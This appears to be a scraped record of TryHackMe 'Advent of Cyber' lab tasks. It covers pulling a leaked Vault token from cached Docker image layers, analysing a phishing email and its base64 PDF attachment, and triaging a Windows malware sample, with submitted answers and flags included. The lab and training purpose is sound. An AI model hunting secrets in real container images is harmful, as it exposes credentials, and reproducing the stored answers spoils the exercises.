eb3bc0f51d18485fe401a411c2dd17/VERSION\nfa28cd504eaba5e76b168c5149551371fbeb3bc0f51d18485fe401a411c2dd17/json\nfa28cd504eaba5e76b168c5149551371fbeb3bc0f51d18485fe401a411c2dd17/layer.tar\nmanifest.json\nrepositories\nroot@ip-10-10-20-249:~/aoc#</code>\n            </pre>\n        </div>\n    </div>\n    \n    <p>These files represent the various container image layers, with the exception of the manifest.json file. manifest.json represents the \"manifest\" of container image layers that compose the final container image we were just inside. Let's take a look at this image using a tool called \"jq\" to \"pretty-print\" the output for easier readability:</p>\n    \n    <p><code>Note: On an attack box, jq is now pre-installed and you can skip this step</code></p>\n    \n    <p>1. Install jq: <code>apt install jq -y</code></p>\n\n  <p></p><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/615df9ae73d1340061780f1b/room-content/0bbc88caac1a2de82d8eea9b52f53ebb.png\" /><p></p>\n    \n    <p>2. Print the contents of manifest.json to the terminal using jq to pretty-print: <code>cat manifest.json | jq</code></p>\n    \n    <div class=\"terminal-container\">\n        <div class=\"terminal-content\">\n            <div class=\"terminal-top\">\n                cat manifest.json\n            </div>\n            <pre class=\"terminal-code\">               <code class=\"language-shell-session\">root@ip-10-10-20-249:~/aoc# cat manifest.json | jq\n[\n  {\n    \"Config\": \"f886f00520700e2ddd74a14856fcc07a360c819b4cea8cee8be83d4de01e9787.json\",\n    \"RepoTags\": [\n      \"public.ecr.aws/h0w1j9u3/grinch-aoc:latest\"\n    ],\n    \"Layers\": [\n      \"a3c1e603ab4385e0b411423e70314651bb371561c45a2bc90951fa05da9ad3c4/layer.tar\",\n      \"619ddb982b75f0eb6c9f48624e6a0d20be227e893599d8dea05dbdddc8b14e2b/layer.tar\",\n      \"40ad0e404f6065a153d1b4d42e8b315be3504a08c21fadd6e5fde5982b45df18/layer.tar\",\n      \"aa7f7d1cdeacc3a446e297814a6c13a42006dc8a99baad72c0c50383d69ac551/layer.tar\",\n      \"4f62ae56d8d3b96d5fbe86da8a3f7bf6e9195d360b922cd7b162e17619c50664/layer.tar\",\n      \"9dedacd92213db743681db2e8d5b3247fd79ce266495d061a381c4c0441ce15d/layer.tar\",\n      \"fa28cd504eaba5e76b168c5149551371fbeb3bc0f51d18485fe401a411c2dd17/layer.tar\",\n      \"4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682/layer.tar\",\n      \"4cc7bdb0ea56d31f57a373d0e7ce0d633ae86dc327087fccf103c8d97f0cc9c4/layer.tar\"\n    ]\n  }\n]\nroot@ip-10-10-20-249:~/aoc#</code>\n</pre>\n</div>\n</div>\n    \n    <p>Note the first piece of information in the file is \"Config\", which represents the underlying configurations and commands used to build the container image -</p>\n    \n    <code>f886f00520700e2ddd74a14856fcc07a36c819b4cea8cee8be83d4de01e9787.json</code>\n    \n    <p>This configuration file is also located in the root of the unpacked container image directory:</p>\n    \n    <div class=\"terminal-container\">\n        <div class=\"terminal-content\">\n            <div class=\"terminal-top\">\n                ls\n            </div>\n            <pre class=\"terminal-code\">               <code class=\"language-shell-session\">root@ip-10-10-20-249:~/aoc# ls\n40ad0e404f6065a153d1b4d42e8b315be3504a08c21fadd6e5fde5982b45df18\n4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682\n4cc7bdb0ea56d31f57a373d0e7ce0d633ae86dc327087fccf103c8d97f0cc9c4\n4f62ae56d8d3b96d5fbe86da8a3f7bf6e9195d360b922cd7b162e17619c50664\n619ddb982b75f0eb6c9f48624e6a0d20be227e893599d8dea05dbdddc8b14e2b\n9dedacd92213db743681db2e8d5b3247fd79ce266495d061a381c4c0441ce15d\na3c1e603ab4385e0b411423e70314651bb371561c45a2bc90951fa05da9ad3c4\naa7f7d1cdeacc3a446e297814a6c13a42006dc8a99baad72c0c50383d69ac551\naoc.tar\nf886f00520700e2ddd74a14856fcc07a360c819b4cea8cee8be83d4de01e9787.json\nfa28cd504eaba5e76b168c5149551371fbeb3bc0f51d18485fe401a411c2dd17\nmanifest.json\nrepositories\nroot@ip-10-10-20-249:~/aoc#</code>\n</pre>\n</div>\n</div>\n    \n    \n    <p>and can be inspected in the same manner as manifest.json:</p>\n    \n    <p><code>cat f886f00520700e2ddd74a14856fcc07a36c819b4cea8cee8be83d4de01e9787.json | jq</code></p>\n    \n    <div class=\"terminal-container\">\n        <div class=\"terminal-content\">\n            <div class=\"terminal-top\">\n                cat .json Config part 1\n            </div>\n            <pre class=\"terminal-code\">                <code class=\"language-shell-session\">root@ip-10-10-20-249:~/aoc# cat f886f00520700e2ddd74a14856fcc07a360c819b4cea8cee8be83d4de01e9787.json | jq\n{\n  \"architecture\": \"amd64\",\n  \"config\": {\n    \"Hostname\": \"\",\n    \"Domainname\": \"\",\n    \"User\": \"newuser\",\n    \"AttachStdin\": false,\n    \"AttachStdout\": false,\n    \"AttachStderr\": false,\n    \"Tty\": false,\n    \"OpenStdin\": false,\n    \"StdinOnce\": false,\n    \"Env\": [\n      \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\n      \"api_key=a90eac086fd049ab9a08374f65d1e977\"\n    ],\n    \"Cmd\": null,\n    \"Image\": \"sha256:035522c2043f6036e879810cfffe0db9665ebb09e1852339231fd805daad5325\",\n    \"Volumes\": null,\n    \"WorkingDir\": \"/home/newuser\",\n    \"Entrypoint\": [\n      \"sh\"\n    ],\n    \"OnBuild\": null,\n    \"Labels\": null\n  },\n  \"container\": \"7b422a5dd0a2a59167ae476fcc18f7ae9a094c02de40b4b4effd42a5d032bae4\",\n  \"container_config\": {\n    \"Hostname\": \"7b422a5dd0a2\",\n    \"Domainname\": \"\",\n    \"User\": \"newuser\",\n    \"AttachStdin\": false,</code>\n    </pre>\n</div>\n</div>\n    \n    <p>The first section of the manifest configuration file walks through the final image configuration as intended to run on a container host system. However, this next section is of particular interest to an attacker - here's how the container image was built. You can see each section broken up by curly braces, and some of the sections have an extra line indicating <code>\"empty_layer\": true</code>.</p>\n    \n    \n    <div class=\"terminal-container\">\n        <div class=\"terminal-content\">\n            <div class=\"terminal-top\">\n                cat .json Config part 2\n            </div>\n            <pre class=\"terminal-code\">                <code class=\"language-shell-session\">\"created\": \"2021-10-21T20:31:17.236366166Z\",\n\"docker_version\": \"20.10.7\",\n\"history\": [\n  {\n    \"created\": \"2021-10-16T00:37:47.226745473Z\",\n    \"created_by\": \"/bin/sh -c #(nop) ADD file:5d68d27cc15a80653c93d3a0b262a28112d47a46326ff5fc2dfbf7fa3b9a0ce8 in / \"\n  },\n  {\n    \"created\": \"2021-10-16T00:37:47.578710012Z\",\n    \"created_by\": \"/bin/sh -c #(nop)  CMD [\\\"bash\\\"]\",\n    \"empty_layer\": true\n  },\n  {\n    \"created\": \"2021-10-20T16:16:12.499990187Z\",\n    \"created_by\": \"/bin/sh -c apt-get upgrade &amp;&amp; apt-get update\"\n  },\n  {\n    \"created\": \"2021-10-20T16:16:46.080121757Z\",\n    \"created_by\": \"/bin/sh -c apt install curl -y\"\n  },\n  {\n    \"created\": \"2021-10-21T20:22:41.837170259Z\",\n    \"created_by\": \"/bin/sh -c apt install python3 -y\"\n  },\n  {\n    \"created\": \"2021-10-21T20:23:42.130217528Z\",\n    \"created_by\": \"/bin/sh -c apt install pip -y\"\n  },\n  {\n    \"created\": \"2021-10-21T20:23:52.8316757Z\",\n    \"created_by\": \"/bin/sh -c apt install git -y\"\n  },\n  {\n    \"created\": \"2021-10-21T20:31:13.639594181Z\",\n    \"created_by\": \"/bin/sh -c git clone https://github.com/hashicorp/envconsul.git root/envconsul/\"\n  },\n  {\n    \"created\": \"2021-10-21T20:31:14.315738313Z\",\n    \"created_by\": \"/bin/sh -c #(nop) WORKDIR /root/envconsul\",\n    \"empty_layer\": true\n  },\n  {\n    \"created\": \"2021-10-21T20:31:14.645450256Z\",\n    \"created_by\": \"/bin/sh -c #(nop) ADD file:cba528c0d7ba7c0c89ad4ce3e550dc4b3128c2804d4dc75daaf1421759f6d664 in . \"\n  },\n  {\n    \"created\": \"2021-10-21T20:31:15.914695012Z\",</code>\n        </pre>\n    </div>\n</div>\n    \n    \n    <p>Each of these sections are describing a particular command run by the Docker daemon at the time that the image was built, and if the <code>\"empty_layer\": true</code> configuration is not listed as part of the section definition, then the container layer is retained in the overall container image as one of the layers listed in the <code>manifest.json</code> file. Of particular interest - we notice the container containers a tool called <code>envconsul</code> that is pulled from Github. Reviewing the Github repository for <a href=\"https://www.github.com/hashicorp/envconsul\">envconsul</a> - the about description states envconsul is a tool that allows a user to \"Launch a subprocess with environment variables using data from @hashicorp Consul and Vault.\" Noting that this source code was cloned into a root directory - perhaps there is something sensitive related to envconsul that a regular container user isn't intended to see at Grinch Enterprises. Let's dig through the image layers and see if we can find out what is so sensitive about envconsul.</p>\n    \n    \n    <p>We can more closely inspect the layers by switching to the sub-directories representing the layers in the unpacked container root directory. As we switch between these layers, we notice one layer of special interest:</p>\n    \n    \n    \n    <div class=\"terminal-container\">\n        <div class=\"terminal-content\">\n            <div class=\"terminal-top\">\n                cat config.hcl\n            </div>\n            <pre class=\"terminal-code\">                <code class=\"language-shell-session\">root@ip-10-10-20-249:~/aoc# cd 4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682/\nroot@ip-10-10-20-249:~/aoc/4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682# tar -xvf layer.tar\nroot/\nroot/envconsul/\nroot/envconsul/config.hcl\nroot@ip-10-10-20-249:~/aoc/4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682# cat root/envconsul/config.hcl\n# This denotes the start of the configuration section for Consul. All values\n# contained in this section pertain to Consul.\nconsul {\n​\n  # This is the address of the Consul agent. By default, this is\n  # 127.0.0.1:8500, which is the default bind and port for a local Consul\n  # agent. It is not recommended that you communicate directly with a Consul\n  # server, and instead communicate with the local Consul agent. There are many\n  # reasons for this, most importantly the Consul agent is able to multiplex\n  # connections to the Consul server and reduce the number of open HTTP\n  # connections. Additionally, it provides a \"well-known\" IP address for which\n  # clients can connect.\n  address = \"127.0.0.1:8500\"\n​\n  # This controls the retry behavior when an error is returned from Consul.\n  # Envconsul is highly fault tolerant, meaning it does not exit in the face\n  # of failure. Instead, it uses exponential back-off and retry functions\n  # to wait for the cluster to become available, as is customary in distributed</code>\n    </pre>\n</div>\n</div>\n    \n    <h3>Spoiler</h3>\n    \n    <p>This layer contains a config.hcl file - as we look at this file in the container image layer - it is clear that sensitive configurations are maintained in the file. Let's use Linux command-line tool <code>grep</code>and see if we can return a \"secret\" or a \"token\"...and there it is on line 4 when grepping with the string 'token'. I wonder if the Grinch Enterprise developers knew that the container image cached all of the container layers? Either way, now we can turn the tables on Grinch Enterprises and access their Vault cluster with all its secrets!</p>\n    \n    <div class=\"terminal-container\">\n        <div class=\"terminal-content\">\n            <div class=\"terminal-top\">\n                grep token\n            </div>\n            <pre class=\"terminal-code\">               <code class=\"language-shell-session\">root@ip-10-10-20-249:~/aoc/4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682# cat root/envconsul/config.hcl | grep 'token'\n# This is the token to use when communicating with the Vault server.\n# assumption that you provide it with a Vault token; it does not have the\n# incorporated logic to generate tokens via Vault's auth methods.\ntoken = \"TOKEN\"\n# This tells Envconsul to load the Vault token from the contents of a file.\n# - by default Envconsul will not try to renew the Vault token, if you want it\n# to renew you will need to specify renew_token = true as below.\n# - Envconsul will periodically stat the file and update the token if it has\n# vault_agent_token_file = \"/path/to/vault/agent/token/file\"\n# This tells Envconsul that the provided token is actually a wrapped\n# token that should be unwrapped using Vault's cubbyhole response wrapping\nunwrap_token = true\n# This option tells Envconsul to automatically renew the Vault token given.\n# If you are unfamiliar with Vault's architecture, Vault requires tokens be\n# automatically renew the token at half the lease duration of the token. The\n# you want to renew the Vault token using an out-of-band process.\n# There is an exception to the default such that if vault_agent_token_file is\n# set, either from the command line or the above option, renew_token defaults\n# token itself.\nrenew_token = true\nroot@ip-10-10-20-249:~/aoc/4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682#</code>\n</pre>\n</div>\n</div>","taskType":"none","taskNo":23,"taskCreated":"2021-11-16T13:47:50.994Z","taskDeadline":null,"tasksInfo":[{"question":"What command will list container images stored in your local container registry?","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":1,"submission":"docker images","noAnswer":false,"answerDesc":"Answer format: ****** ******"},{"question":"<p>What command will allow you to save a docker image as a tar archive?<br /></p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":1,"submission":"docker save","noAnswer":false,"answerDesc":"Answer format: ****** ****"},{"question":"<p>What is the name of the file (including file extension) for the configuration, repository tags, and layer hash values stored in a container image?<br /></p>","hint":"","questionNo":3,"correct":true,"extraPoints":0,"attempts":1,"submission":"manifest.json","noAnswer":false,"answerDesc":"Answer format: ********.****"},{"question":"<p>What is the token value you found for the bonus challenge?<br /></p>","hint":"","questionNo":4,"correct":true,"extraPoints":0,"attempts":2,"submission":"7095b3e9300542edadbc2dd558ac11fa","noAnswer":false,"answerDesc":"Answer format: ********************************"}],"uploadId":"","questions":[{"questionNo":1,"question":"What command will list container images stored in your local container registry?","hint":""},{"questionNo":2,"question":"<p>What command will allow you to save a docker image as a tar archive?<br /></p>","hint":""},{"questionNo":3,"question":"<p>What is the name of the file (including file extension) for the configuration, repository tags, and layer hash values stored in a container image?<br /></p>","hint":""},{"questionNo":4,"question":"<p>What is the token value you found for the bonus challenge?<br /></p>","hint":""}]},{"taskTitle":"[Day 19] <span class=\"badge badge-soft-primary size-16\">Blue Teaming</span> Something Phishy Is Going On","taskDesc":"<p><span style=\"font-size:1rem\">Deploy the virtual machine attached to this task; it will be visible in the split-screen view once it is ready. </span><br /></p><p>If you don't see a virtual machine load, then click the <span style=\"font-weight:bolder\">Show Split View</span> button. </p><p><img src=\"https://assets.tryhackme.com/additional/samaoc3/split-view.png\" style=\"width:451px\" /></p><hr style=\"border:1px solid var(--main-color)\" /><p><span style=\"font-size:1rem\">McSkidy received reports of multiple phishing attempts from various elves. </span><br /></p><p>One of the elves shared the email that was sent to her, along with the attachment. The email was forwarded as a .eml file, along with the base64 encoded string in a text file. Is Grinch Enterprises up to their shenanigans? </p><hr style=\"border:1px solid var(--main-color)\" /><h2><span style=\"font-size:24px\">Check out CyberSecMeg's walkthrough video for day 19 </span><a href=\"https://youtu.be/0XKkSYVftPA\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a></h2><p><span style=\"font-size:1rem\"><br />Adversaries use a technique known as Phishing to attempt to infiltrate a target organization and gain a foothold (Initial Access).  </span><br /></p><p>The definition of Phishing according to the MITRE ATT&amp;CK Framework: \"<span style=\"font-weight:bolder;font-style:italic\">Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns</span>.</p><p><span style=\"font-weight:bolder\"><i>Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source</i></span>.\" </p><p><span style=\"font-size:1rem\">Reference - <a href=\"https://attack.mitre.org/techniques/T1566/\" target=\"_blank\">https://attack.mitre.org/techniques/T1566/</a></span></p><p>Since this type of attack targets employees of both small and large organizations alike, security awareness training is often enforced to help minimize the chances of a recipient falling victim to this type of attack.</p><p>There are several signs to look for in emails without performing extensive analysis to help determine whether an email is potentially a phishing attempt. <span style=\"font-size:1rem\">Some examples are listed below:</span></p><p>- Do you know the sender? Does the email address match the sender? Does the reply-to email match the sender?</p><p><img src=\"https://assets.tryhackme.com/additional/samaoc3/sender-email2.png\" style=\"width:480px\" /><br /></p><p>- In the email body, does the email greet you personally (Hello McSkidy), or is it very generic (Hello Elf)?</p><p>- Does the email contain any grammar mistakes, such as misspelled words?</p><p>- Does the email give you a sense of urgency where you need to act fast? Such as a deadline to prevent your account from being disabled.</p><p><img src=\"https://assets.tryhackme.com/additional/samaoc3/email-body2.png\" style=\"width:468px\" /><br /></p><p>- Does the email contain a link or a clickable button that redirects you to a website? Does the link match the sender, or is it a random website?</p><p><br /></p><p><img src=\"https://assets.tryhackme.com/additional/samaoc3/email-link3.png\" style=\"width:662px\" /><br /></p><p>- Is there an attachment to the email? </p><p><img src=\"https://assets.tryhackme.com/additional/samaoc3/email-attachment2.png\" style=\"width:561px\" /><br /></p><p>Now you're ready to dive in. Within the attached virtual machine, open the mail application. <img src=\"https://assets.tryhackme.com/additional/aoc2021/mail-icon.png\" style=\"font-size:1rem;width:161px\" /></p><p><span style=\"font-weight:bolder\">Email.eml</span> will automatically open for you. I<span style=\"font-size:1rem\">nspect the file contents of</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem;font-weight:bolder\">email.eml</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">and answer the questions below. </span><span style=\"font-size:1rem\"> </span></p><p>When reviewing email source code, you'll typically see encoded strings in <span style=\"font-weight:bolder\">Base64</span> (a mathematical calculation performed on characters to encode them into a reversible format).  See an example below.</p><p><img src=\"https://assets.tryhackme.com/additional/samaoc3/email-base64.png\" style=\"width:588px\" /><br /></p><p><span style=\"font-size:1rem\">To view the source code of the email, please reference the example below.</span></p><p><img src=\"https://assets.tryhackme.com/additional/samaoc3/email-source.png\" style=\"width:189px\" /><span style=\"font-size:1rem\"><br /></span></p><p><span style=\"font-size:1rem\">Below are the commands to assist you with analyzing the encoded <span style=\"font-weight:bolder\">attachment</span> text file.</span></p><p>- You can use the Linux command line to read the contents of the text files. </p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Read the attachment.txt file</div><pre class=\"terminal-code\" style=\"font-size:14px\">           <code class=\"language-shell-session\">mcskidy@elfmode$ cat attachment.txt</code>\n        </pre></div></div><p>- To decode the <span style=\"font-weight:bolder\">Base64</span> encoded string in the Linux command-line, you can use the following command:</p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Decode the string in the attachment-base64-only.txt file</div><pre class=\"terminal-code\" style=\"font-size:14px\">           <code class=\"language-shell-session\">mcskidy@elfmode$ cat attachment-base64-only.txt | base64 -d</code>\n        </pre></div></div><p>- To convert the <span style=\"font-weight:bolder\">Base64</span> encoded string to its original file format, you can use the following command:</p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Decode the encoded string and save as a PDF file</div><pre class=\"terminal-code\" style=\"font-size:14px\">           <code class=\"language-shell-session\">mcskidy@elfmode$ cat attachment-base64-only.txt | base64 -d &gt; file.pdf</code>\n        </pre></div></div><p>You know the file is a PDF file based on the <span style=\"font-weight:bolder\">magic header</span>. See below.</p><p><img src=\"https://assets.tryhackme.com/additional/samaoc3/verify-pdf.png\" style=\"width:482px\" /><br /></p><p>What are <span style=\"font-weight:bolder\">magic headers</span>? Refer to this Wikipedia <a href=\"https://en.wikipedia.org/wiki/List_of_file_signatures\" target=\"_blank\">link</a> for more information.</p><p><span style=\"font-weight:bolder\">Note</span>: You can try to convert the<span style=\"font-weight:bolder\"> Base64</span> into the actual PDF file using <span style=\"font-weight:bolder\">CyberChef</span>.</p><p><span style=\"font-weight:bolder\">P.S.</span> Don't worry; you'll be introduced to <span style=\"font-weight:bolder\">CyberChef</span> in the upcoming days if you're not familiar with it. ;)</p>","taskType":"vm","taskNo":24,"taskCreated":"2021-11-16T13:47:51.734Z","taskDeadline":null,"tasksInfo":[{"question":"Who was the email sent to? (Answer is the email address)","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":1,"submission":"elfmcphearson@tbfc.com","noAnswer":false,"answerDesc":"Answer format: ******************.***"},{"question":"<p>Phishing emails use similar domains of their targets to increase the likelihood the recipient will be tricked into interacting with the email. Who does it say the email was from? (Answer is the email address)<br /></p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":1,"submission":"customerservice@t8fc.info","noAnswer":false,"answerDesc":"Answer format: ********************.****"},{"question":"<p>Sometimes phishing emails have a different reply-to email address. If this email was replied to, what email address will receive the email response?<br /></p>","hint":"","questionNo":3,"correct":true,"extraPoints":0,"attempts":1,"submission":"fisher@tempmailz.grinch","noAnswer":false,"answerDesc":"Answer format: ****************.******"},{"question":"<p>Less sophisticated phishing emails will have typos. What is the misspelled word?<br /></p>","hint":"","questionNo":4,"correct":true,"extraPoints":0,"attempts":5,"submission":"stright","noAnswer":false,"answerDesc":"Answer format: *******"},{"question":"<p>The email contains a link that will redirect the recipient to a fraudulent website in an effort to collect credentials. What is the link to the credential harvesting website?<br /></p>","hint":"","questionNo":5,"correct":true,"extraPoints":0,"attempts":2,"submission":"https://89xgwsnmo5.grinch/out/fishing/","noAnswer":false,"answerDesc":"Answer format: *****://**********.******/***/*******/"},{"question":"<p>View the email source code. There is an unusual email header. What is the header and its value?<br /></p>","hint":"","questionNo":6,"correct":true,"extraPoints":0,"attempts":1,"submission":"X-GrinchPhish: >;^)","noAnswer":false,"answerDesc":"Answer format: *************: ****"},{"question":"<p>You received other reports of phishing attempts from other colleagues. Some of the other emails contained attachments. Open attachment.txt. What is the name of the attachment?<br /></p>","hint":"","questionNo":7,"correct":true,"extraPoints":0,"attempts":2,"submission":"password-reset-instructions.pdf","noAnswer":false,"answerDesc":"Answer format: ***************************.***"},{"question":"<p>What is the flag in the PDF file?<br /></p>","hint":"","questionNo":8,"correct":true,"extraPoints":0,"attempts":1,"submission":"THM{A0C_Thr33_Ph1sh1ng_An4lys!s}","noAnswer":false,"answerDesc":"Answer format: ***{***************************}"},{"question":"<p>If you want to learn more about phishing, check out the <a href=\"https://tryhackme.com/module/phishing\" target=\"_blank\">\"Phishing\" module</a> on TryHackMe.</p>","hint":"","questionNo":9,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"}],"uploadId":"61b107a1b9b9bb005f18d29d","questions":[{"questionNo":1,"question":"Who was the email sent to? (Answer is the email address)","hint":""},{"questionNo":2,"question":"<p>Phishing emails use similar domains of their targets to increase the likelihood the recipient will be tricked into interacting with the email. Who does it say the email was from? (Answer is the email address)<br /></p>","hint":""},{"questionNo":3,"question":"<p>Sometimes phishing emails have a different reply-to email address. If this email was replied to, what email address will receive the email response?<br /></p>","hint":""},{"questionNo":4,"question":"<p>Less sophisticated phishing emails will have typos. What is the misspelled word?<br /></p>","hint":""},{"questionNo":5,"question":"<p>The email contains a link that will redirect the recipient to a fraudulent website in an effort to collect credentials. What is the link to the credential harvesting website?<br /></p>","hint":""},{"questionNo":6,"question":"<p>View the email source code. There is an unusual email header. What is the header and its value?<br /></p>","hint":""},{"questionNo":7,"question":"<p>You received other reports of phishing attempts from other colleagues. Some of the other emails contained attachments. Open attachment.txt. What is the name of the attachment?<br /></p>","hint":""},{"questionNo":8,"question":"<p>What is the flag in the PDF file?<br /></p>","hint":""},{"questionNo":9,"question":"<p>If you want to learn more about phishing, check out the <a href=\"https://tryhackme.com/module/phishing\" target=\"_blank\">\"Phishing\" module</a> on TryHackMe.</p>","hint":""}]},{"taskTitle":"[Day 20] <span class=\"badge badge-soft-primary size-16\">Blue Teaming</span> What's the Worst That Could Happen?","taskDesc":"<p><span style=\"font-size:24px\"><span style=\"font-weight:bolder\">Story:</span></span><br /></p><p>McPayroll is processing the bonuses for all the hardworking elves. One of the Elves has sent McPayroll a file that they're claiming contains their updated payment information. The only problem is that she doesn't recognize the Elf - could this be a sneaky attack from Grinch Enterprises to cause more havoc? Analyze the file to see if you can determine whether it's malicious or not!</p><p><span style=\"font-size:1rem\">McPayroll provides this file to McSkidy who is a member of the security team. McSkidy is a wise elf. She knows to analyze this file in a sandboxed environment. Therefore, she fired up her </span><a href=\"https://remnux.org/\">Remnux</a><span style=\"font-size:1rem\"> VM to take a look at the suspicious file. She unzipped the archive and saw that there was a folder named 'Samples' and a file named 'testfile' in the zip archive. She copied these files over to her Remnux desktop to begin the analysis.</span></p><h2><span style=\"font-size:24px\">Check out Saqib's walkthrough video for day 20 </span><a href=\"https://www.youtube.com/watch?v=gwBCa1M7w38\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a><br /><br /></h2><p><span style=\"font-size:24px\"><span style=\"font-weight:bolder\">Learning Objectives:</span></span></p><p>﻿In this task, we will learn:</p><ol><li>How to identify the file type of a file regardless of file extension</li><li>How to find strings in a file</li><li>How to calculate hash of a file</li><li>Using VirusTotal to perform preliminary analysis of a suspicious file</li></ol><p><span style=\"font-size:24px\">﻿</span><span style=\"font-weight:bolder;font-size:24px\">Initial analysis:</span><br /></p><p>To get started with the analysis, McSkidy started by running the <code style=\"font-size:14px\">file</code> command. The <code style=\"font-size:14px\">file</code> command is a Linux utility that helps determine a given file's file type, regardless of the file extension the file may have. McSkidy understands that malware authors sometimes use misleading file extensions, so she verifies the file type as the first step.</p><p>The following syntax is used to check the file type of a file:</p><p><code style=\"font-size:14px\">file &lt;filename&gt;</code></p><p>You can read more about the file utility by running the following command in the Linux terminal:</p><p><code style=\"font-size:14px\">file --help</code> or <code style=\"font-size:14px\">man file</code></p><p>Here is a screenshot of McSkidy running the file command on one of the files:</p><p><code style=\"font-size:14px\">ubuntu@ip-10-10-19-243:~/Desktop/Samples$ file exmatter                               </code><code style=\"font-size:14px\">exmatter: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows    </code><code style=\"font-size:14px\">ubuntu@ip-10-10-19-243:~/Desktop/Samples                                              <br /></code>       </p><p></p><p><span style=\"font-size:1rem\">This file seems to be a Windows executable file. It seems like McSkidy’s suspicions held their weight. To gather more information about the file, McSkidy tries the </span><code style=\"font-size:14px\">strings</code><span style=\"font-size:1rem\"> command. The </span><code style=\"font-size:14px\">strings</code><span style=\"font-size:1rem\"> command is also a Linux utility. This utility extracts and prints the printable character sequences from a given file or what's also known as 'strings'. Knowing what strings are present in a file can often provide interesting information about the file. Specifically for executable files, the strings utility can give pointers to the different functions called by the executable file, any IP addresses or domain names, URLs, etc. which might help in further analysis. This information may also help security tools like antivirus software in flagging files as malicious by identifying possible malicious traces (or Indicators Of Compromise/IOCs as they are called in the security industry).</span><br /></p><p>The following syntax is used for the <code style=\"font-size:14px\">strings</code> command:</p><p><code style=\"font-size:14px\">strings &lt;filename&gt;</code></p><p>You can read more about the <code style=\"font-size:14px\">strings</code> utility and its options by running the following command in the Linux terminal:</p><p><code style=\"font-size:14px\">strings --help</code> or <code style=\"font-size:14px\">man strings</code></p><p>The output of the strings command was a little too long for the terminal window, McSkidy saved the output to a file. This can be done by redirecting the output to a file:</p><p><code style=\"font-size:14px\">strings &lt;filename&gt; &gt; strings_output.txt</code></p><p>This was the <code style=\"font-size:14px\">strings</code> output:</p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/aoc20/1.png\" style=\"width:734.25px\" /></p><p>You can see that the first line reads: \"This program cannot be run in DOS mode\". This is part of the DOS stub of a Windows executable. McSkidy was a little confused when looking at this file, as it contained a lot of gibberish. However, she kept scrolling until she was rewarded with some interesting strings:</p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/aoc20/2.png\" style=\"width:734.25px\" /></p><p>As McSkidy started to discover more interesting strings, she started to gain an idea of what the evil elf's intentions were with the malware. She could see references to 'ssh', 'session', 'message', and 'disconnect', which hints that this executable might be trying to establish some kind of an SSH connection to send a message or file.</p><p><span style=\"font-size:24px\"><span style=\"font-weight:bolder\">VirusTotal:</span></span><br /></p><p><span style=\"font-size:1rem\">Even though this functionality could be used in a non-malicious program, McSkidy was unwilling to take any chances. Therefore, McSkidy decided to upload the file to </span><a href=\"http://virustotal.com/\">VirusTotal</a><span style=\"font-size:1rem\">. VirusTotal is a website that will scan files, URLs, IP addresses, domains, or a file hash you provide using 60+ different Antivirus software products and displays a summary of their scan results.</span><br /></p><p>On the homepage, McSkidy had a few options to either: submit a file, a URL, IP address, domain, or search using the file's hash. McSkidy understood that the file could contain sensitive information and should not be uploaded to a third-party analysis service right away, so she calculated its MD5 hash and searched VirusTotal using the file's hash. </p><p>On a Linux system, the program <code style=\"font-size:14px\">md5sum</code> can be used to output the MD5 hash of a file:</p><p><code style=\"font-size:14px\">md5sum &lt;filename&gt;</code></p><p>Once she had the MD5 hash, McSkidy searched it on VirusTotal</p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/aoc20/3.png\" style=\"width:734.25px\" /></p><p>After pressing enter, she saw the results that confirmed her suspicions. She could see that the file was marked as malicious by a majority of Antivirus software vendors. Moreover, she could see the classification each Antivirus software had given the file:</p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/aoc20/4.png\" style=\"width:734.25px\" /></p><p>On the details tab, she could see the hashes of the file, its submission history with VirusTotal, and the different properties of the file:</p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/aoc20/5.png\" style=\"width:734.25px\" /></p><p>The relations tab explains the relations between the malware and the different domains, IP addresses and files that are associated with it, and their VirusTotal scores (if available):</p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/aoc20/6.png\" style=\"width:734.25px\" /></p><p>The behavior tab shows the different activities performed by the malware, based on a few different behavioral detection engines:</p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/aoc20/7.png\" style=\"width:734.25px\" /></p><p>Finally, the community tab contains community member posts and what their view on the malware is:</p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/aoc20/8.png\" style=\"width:734.25px\" /></p><p>After looking at all this information, McSkidy was certain that this particular file in the package was malicious!</p><p>Now, let's log into the machine attached with the task and help McSkidy answer the following questions.</p><p>Deploy the machine attached to the task. It will be visible in the split-screen view when 